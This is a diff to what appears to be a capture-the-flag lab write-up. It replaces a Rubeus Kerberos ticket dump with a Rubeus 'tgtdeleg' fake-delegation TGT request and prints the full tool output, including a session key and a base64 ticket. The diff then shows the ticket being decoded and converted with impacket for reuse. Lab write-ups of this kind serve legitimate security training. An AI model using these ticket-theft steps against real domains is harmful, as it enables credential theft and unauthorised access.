@@ -1161,8 +1161,8 @@ PS C:\Users\ryan.brooks\Desktop>
 
 ``` bash
 
-PS C:\Users\ryan.brooks\Desktop> .\Rubeus.exe dump /nowrap
-.\Rubeus.exe dump /nowrap
+PS C:\Users\ryan.brooks\Desktop> .\Rubeus.exe tgtdeleg /nowrap
+.\Rubeus.exe tgtdeleg /nowrap
 
    ______        _
   (_____ \      | |
@@ -1174,67 +1174,26 @@ PS C:\Users\ryan.brooks\Desktop> .\Rubeus.exe dump /nowrap
   v2.2.0
 
 
-Action: Dump Kerberos Ticket Data (Current User)
+[*] Action: Request Fake Delegation TGT (current user)
 
-[*] Current LUID    : 0x6ee57
+[*] No target SPN specified, attempting to build 'cifs/dc.domain.com'
+[*] Initializing Kerberos GSS-API w/ fake delegation for target 'cifs/DC01.checkpoint.htb'
+[+] Kerberos GSS-API initialization success!
+[+] Delegation requset success! AP-REQ delegation ticket is now in GSS-API output.
+[*] Found the AP-REQ delegation ticket in the GSS-API output.
+[*] Authenticator etype: aes256_cts_hmac_sha1
+[*] Extracted the service ticket session key from the ticket cache: ZJMPf2li2BnlGh0V8cAgr+gyfNxWjLDmi/55xow3rjA=
+[+] Successfully decrypted the authenticator
+[*] base64(ticket.kirbi):
 
-  UserName                 : ryan.brooks
-  Domain                   : CHECKPOINT
-  LogonId                  : 0x6ee57
-  UserSID                  : S-1-5-21-3129162710-3498938529-1807524340-1103
-  AuthenticationPackage    : Negotiate
-  LogonType                : Interactive
-  LogonTime                : 8/28/2026 7:12:08 PM
-  LogonServer              : DC01
-  LogonServerDNSDomain     : CHECKPOINT.HTB
-  UserPrincipalName        : ryan.brooks@checkpoint.htb
-
-
-    ServiceName              :  krbtgt/CHECKPOINT.HTB
-    ServiceRealm             :  CHECKPOINT.HTB
-    UserName                 :  ryan.brooks
-    UserRealm                :  CHECKPOINT.HTB
-    StartTime                :  8/28/2026 9:31:08 PM
-    EndTime                  :  8/29/2026 7:31:08 AM
-    RenewTill                :  9/4/2026 9:31:08 PM
-    Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
-    KeyType                  :  aes256_cts_hmac_sha1
-    Base64(key)              :  AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=
-    Base64EncodedTicket   :
-
-      doIF1DCCBdCgAwIBBaEDAgEWooIE0DCCBMxhggTIMIIExKADAgEFoRAbDkNIRUNLUE9JTlQuSFRCoiMwIaADAgECoRowGBsGa3JidGd0Gw5DSEVDS1BPSU5ULkhUQqOCBIQwggSAoAMCARKhAwIBAqKCBHIEggRulh/4thkiF7SljAoZRig8QaUvp6noWyuChQ1XdaArQXmusm6+mRS6MUZ5/q48AGe0CmUCALNScgQrfvPVhXBKbzEdBsrwGzS/DYdHARlBUrC+R0Y7si+QhcRXcO7h1TaT0NtOihakgFWOwn1a7EBsmEbemBhdnNiKteZsOHJQ1YYN3GuLGkwwFxBiqOWPdb57NUR4J0zzNRFvUzbY5vWcANAMv97W9+CdO7XSa1TPD5OZMD84LUX7OP70XgevxmCDlAnB4i5h0gnkyPrTWhUxZNEgmHLBCj4QoUKam2Pc7eWqHqJbxvG8euNFvmEJ7pDrdxgYVS+N6+IRKN+yqi2nFAHp1bdp3jneiHbfyMeMTaNnSvVOXI90GjzJ19bFTHBMoHSHEHhTQYvCP8nB5bBxR0unGl0eAPvP/wtclvFLq/TX4m0jJB8NLMCjgVBDtK0F4tmi4gZE3ArpdTYGwbybeFhiYSsTlrRs3MVCS1l8RLOr5OC4yjU0wC53QtraPANf59OX+RdR8KSZOZTE2N4JRG4ACFf6QOXwNhH5M+R35gNtFUqhuCcBAqJ9/sJDLcOM6MC22srkq/PI3Bq7n8TYMP7hIuRRZU0K2GbtcUAGBfOVaRFYP7hjhCqkePf/IZyDj1D33rzPucnkjfpZqjHVAJQJfqRdOKFCW5tfgJM3dsU6r14Tyn9ppOTa0WiOXS3pMo2Isui2Mjb4UBZl3n5xadNNhWS4Cio8BgyRg+IuCSwS3J2GlPXcUe15zFa1ekQ6d1cfa0FhbwEu/dd1AJX/BZfEBUL8MzM4vqpn4qpA2RgTTU8/94E0JfckWCj9PxuEMnEr7dYC7FmnE/7jcy9KnMEgLzaiIlczKJYAa4UtKsCJ6ssfeCA1ga31SsSr1asD0pBPCS7ZezemMf6xPLriGsmWn7g/ozfVb8gn0Hz6dPzfWtWIkprdl98Y423sY9QQ8cuXbg98D1aXhkcwm+duHdcYmKMNn91kGQqNchrLvrx/oSCUltQCuP71ChjpjGIZa8d3CUiUbBZKmJ1nE1wOoYLq6VYLr2S0tChwCnO/EHVs+RFjb0Z4rhxObgpSPRD3hPnW8YJSbCItPfwDLCvoIFE2WmcHLNVLVjLDvqnGuVtL4nR1u0HAM34ULNmMhFQ2l2wgvTBgpIId3L/6uhFaqR5raIw2Ob+1l0IGHXxe5gBH02fKtKm3Kxdri95YP1Z4MVlzlfYzcLHl1nzhhCZhmIzawWB16ut8T2EZr9qMJ3aIdEzth7ZJAaS6e1DFMC8prZwNIGm/MsNdtDFD5j9Jbxo410d3MMfjjF8D0dpAXRl1hpD3/eN9W/ik5hK0UJpf0Ttks0u/+P+yAEU5sM9d0Cg/yhTUrOBXuGFQY9Jdspx61JlszCZFjzofFVyXYLGC3JeAZ6vU94geU6jRhZeMvAx/pOajuWW/lkJqd8n1yVNJ3yCSKZKtD1nW9t7e7uwSDoTLwhJ/iPPb//OE6FU+RHhUshWMOcGvv94Qrmi9o4HvMIHsoAMCAQCigeQEgeF9gd4wgduggdgwgdUwgdKgKzApoAMCARKhIgQgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAChEBsOQ0hFQ0tQT0lOVC5IVEKiGDAWoAMCAQGhDzANGwtyeWFuLmJyb29rc6MHAwUAQOEAAKURGA8yMDI2MDgyOTA0MzEwOFqmERgPMjAyNjA4MjkxNDMxMDhapxEYDzIwMjYwOTA1MDQzMTA4WqgQGw5DSEVDS1BPSU5ULkhUQqkjMCGgAwIBAqEaMBgbBmtyYnRndBsOQ0hFQ0tQT0lOVC5IVEI=
-
-
-    ServiceName              :  HOST/dc01.checkpoint.htb
-    ServiceRealm             :  CHECKPOINT.HTB
-    UserName                 :  ryan.brooks
-    UserRealm                :  CHECKPOINT.HTB
-    StartTime                :  8/28/2026 9:31:08 PM
-    EndTime                  :  8/29/2026 7:31:08 AM
-    RenewTill                :  9/4/2026 9:31:08 PM
-    Flags                    :  name_canonicalize, ok_as_delegate, pre_authent, renewable, forwardable
-    KeyType                  :  aes256_cts_hmac_sha1
-    Base64(key)              :  etA5OWQjFFiUW07opZ6IpFyRzAFV9WDR4AbchaYzUJA=
-    Base64EncodedTicket   :
-
-      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
+      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
 PS C:\Users\ryan.brooks\Desktop>
 
 ```
 
 ``` bash
 
-❯ echo "doIF1DCCBdCgAwIBBaEDAgEWooIE0DCCBMxhggTIMIIExKADAgEFoRAbDkNIRUNLUE9JTlQuSFRCoiMwIaADAgECoRowGBsGa3JidGd0Gw5DSEVDS1BPSU5ULkhUQqOCBIQwggSAoAMCARKhAwIBAqKCBHIEggRulh/4thkiF7SljAoZRig8QaUvp6noWyuChQ1XdaArQXmusm6+mRS6MUZ5/q48
-AGe0CmUCALNScgQrfvPVhXBKbzEdBsrwGzS/DYdHARlBUrC+R0Y7si+QhcRXcO7h1TaT0NtOihakgFWOwn1a7EBsmEbemBhdnNiKteZsOHJQ1YYN3GuLGkwwFxBiqOWPdb57NUR4J0zzNRFvUzbY5vWcANAMv97W9+CdO7XSa1TPD5OZMD84LUX7OP70XgevxmCDlAnB4i5h0gnkyPrTWhUxZNEgm
-HLBCj4QoUKam2Pc7eWqHqJbxvG8euNFvmEJ7pDrdxgYVS+N6+IRKN+yqi2nFAHp1bdp3jneiHbfyMeMTaNnSvVOXI90GjzJ19bFTHBMoHSHEHhTQYvCP8nB5bBxR0unGl0eAPvP/wtclvFLq/TX4m0jJB8NLMCjgVBDtK0F4tmi4gZE3ArpdTYGwbybeFhiYSsTlrRs3MVCS1l8RLOr5OC4yjU0wC
-53QtraPANf59OX+RdR8KSZOZTE2N4JRG4ACFf6QOXwNhH5M+R35gNtFUqhuCcBAqJ9/sJDLcOM6MC22srkq/PI3Bq7n8TYMP7hIuRRZU0K2GbtcUAGBfOVaRFYP7hjhCqkePf/IZyDj1D33rzPucnkjfpZqjHVAJQJfqRdOKFCW5tfgJM3dsU6r14Tyn9ppOTa0WiOXS3pMo2Isui2Mjb4UBZl3n5
-xadNNhWS4Cio8BgyRg+IuCSwS3J2GlPXcUe15zFa1ekQ6d1cfa0FhbwEu/dd1AJX/BZfEBUL8MzM4vqpn4qpA2RgTTU8/94E0JfckWCj9PxuEMnEr7dYC7FmnE/7jcy9KnMEgLzaiIlczKJYAa4UtKsCJ6ssfeCA1ga31SsSr1asD0pBPCS7ZezemMf6xPLriGsmWn7g/ozfVb8gn0Hz6dPzfWtWI
-kprdl98Y423sY9QQ8cuXbg98D1aXhkcwm+duHdcYmKMNn91kGQqNchrLvrx/oSCUltQCuP71ChjpjGIZa8d3CUiUbBZKmJ1nE1wOoYLq6VYLr2S0tChwCnO/EHVs+RFjb0Z4rhxObgpSPRD3hPnW8YJSbCItPfwDLCvoIFE2WmcHLNVLVjLDvqnGuVtL4nR1u0HAM34ULNmMhFQ2l2wgvTBgpIId3
-L/6uhFaqR5raIw2Ob+1l0IGHXxe5gBH02fKtKm3Kxdri95YP1Z4MVlzlfYzcLHl1nzhhCZhmIzawWB16ut8T2EZr9qMJ3aIdEzth7ZJAaS6e1DFMC8prZwNIGm/MsNdtDFD5j9Jbxo410d3MMfjjF8D0dpAXRl1hpD3/eN9W/ik5hK0UJpf0Ttks0u/+P+yAEU5sM9d0Cg/yhTUrOBXuGFQY9Jdsp
-x61JlszCZFjzofFVyXYLGC3JeAZ6vU94geU6jRhZeMvAx/pOajuWW/lkJqd8n1yVNJ3yCSKZKtD1nW9t7e7uwSDoTLwhJ/iPPb//OE6FU+RHhUshWMOcGvv94Qrmi9o4HvMIHsoAMCAQCigeQEgeF9gd4wgduggdgwgdUwgdKgKzApoAMCARKhIgQgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAChEBsOQ0hFQ0tQT0lOVC5IVEKiGDAWoAMCAQGhDzANGwtyeWFuLmJyb29rc6MHAwUAQOEAAKURGA8yMDI2MDgyOTA0MzEwOFqmERgPMjAyNjA4MjkxNDMxMDhapxEYDzIwMjYwOTA1MDQzMTA4WqgQGw5DSEVDS1BPSU5ULkhUQqkjMCGgAwIBAqEaMBgbBmtyYnRndBsOQ0hFQ0tQT0lO
-VC5IVEI=" > ryan.b64
+❯ echo "doIF1DCCBdCgAwIBBaEDAgEWooIE0DCCBMxhggTIMIIExKADAgEFoRAbDkNIRUNLUE9JTlQuSFRCoiMwIaADAgECoRowGBsGa3JidGd0Gw5DSEVDS1BPSU5ULkhUQqOCBIQwggSAoAMCARKhAwIBAqKCBHIEggRuC0G5PhMloPmNedBDCEL2mZyaH7Uq8kXphUNy1Eg84oNFk93xHu7PFqhlGJXxygHC2NncU4JNtfwk8qpJfsX9qXisjLlMjJoANs40tKcMF1R9+V2xdQ1yU9gavEkJeJ8XeiQg+fyvlYnL4L0G63ZxgpM6FydmRdUNV/oFajXceeJQ7zo2RtaUMZFh7c2m8pv0NlDQ4IK5nRYd5L9NT9FbocJGR2qaa9Q9H/3egvzLW6+UFYXNWW+exGm4cieNLJrzqk3yt9Lnh3DqnRPNLO63t3wKcWqFRNjtsi/yVRAIZTPNpnt96e4KHviF/W1qrCjBYNSuI93pf6tLKzC9+O1ik2wsEzhO/8JJqloXkwlaQdlg4eHaiYnTn+5TGSLZiPO7FOWbkpUCN1QGLjeiytUbSKbbLzi2YPK8mxbCUDAcNfzQe6lHspeMdjjuDlMUC82FgLL7U0DGmm7d+hxnFAAR/zKRmwy9WVvYVN9izoIt5/Ars+PGyzVnOgsDzwuLk+H7mhJYC6Z+/3BtK/dtU24qqa5XYGYKopA+nbHCkJd6MoxFx//W+QEkpbPHuk5/zBk/uQihGNSshB7D4XgSM/k2SPkfWPHiqh7a0uxIxSKBjj8xjtXiYng0vDL2ODc3LxIJ2Bm9lKdX4fKQ93DErEU8/kgG65b9ciQGPfTaYMiz53CXMluTife+G7yNclTQkW2kc4WfGrmBhAv9/einyur8B92lYEqTYuW//J+ouQpeipKHkPJcCdV61fFA5UuT/XadwuQFna7gEi8Qzc11+GQQp4eGjb4CQm2CLBQqfeVksb720tLBOo6fVCZiKATZ3d4QpMHpfYE/ob3c0K5T1effkUeBNuzKOE/TMEkxY0x82KmuE0BCq7ospEhGDL1XMjiEJkanFd6ZJFRkUyBrhMN1VJYuwwlnSxVKkWJgLPJgK7iWh+TDzXa08bbSlwVrWJyo6xYeO93Us6Qw6kUioTPtL0UNWTIIg5ii2TKzLnyBo/UwYFcaSUBRrOyEiHCI/gLg9djDb0VuPbJFX/tH/AFr/W3UK98r5hQqINiGvDDYaVaAxyAMX+RCWFNaDMYeO++GvsJmU8zDxiW4k8GRYVIXjLJyVuXVub1swc0Yy69H67pbQg+MLJa6DX7RZQNB6b4JRSlSYFnI0JUEvsyXM2LaIsiChUdsFVreZJsDKmaf9MKYfPKQoblpQ1tXEhxg0VTg06J9k9JRtDxDfxTHzS41WVWt6XBSkQAVzulv/iviRZmsQD4jhlFgrSLSPaOhwsHmcrJPiwVrYxNzDNspd+BE4pwEBXH3yCpjUkxC3YUhRPgi4U4hnaBW3lu7ZSateFxONEI+Q6J5LMZ9NhP2zQ1sJddLIumPNv3jTaegTXQF8B8brycBB77f2xzVGyM+YB4Ut28BYB0sxQJnxodihNy0crr+B0xWhWR627qorSGU0aQYho1g7jpJHEWp4H6sciparhKNUjEERlsqrlOQGJbEvVbR9fdkK5ewNXwh06m/o4HvMIHsoAMCAQCigeQEgeF9gd4wgduggdgwgdUwgdKgKzApoAMCARKhIgQgxNcLQf101xeBHH10fp7tco8LTIDWh6w/J4HWk0G/ky+hEBsOQ0hFQ0tQT0lOVC5IVEKiGDAWoAMCAQGhDzANGwtyeWFuLmJyb29rc6MHAwUAYKEAAKURGA8yMDI2MDgyOTA1MjY1MlqmERgPMjAyNjA4MjkxNTE2NDNapxEYDzIwMjYwOTA1MDQzMTA4WqgQGw5DSEVDS1BPSU5ULkhUQqkjMCGgAwIBAqEaMBgbBmtyYnRndBsOQ0hFQ0tQT0lOVC5IVEI=" > ryan.b64
 ❯ base64 -d ryan.b64 > ryan.kirbi
 ❯ impacket-ticketConverter ryan.kirbi ryan.ccache
 Impacket v0.14.0.dev0+20260828.120813.032dfb1b - Copyright Fortra, LLC and its affiliated companies
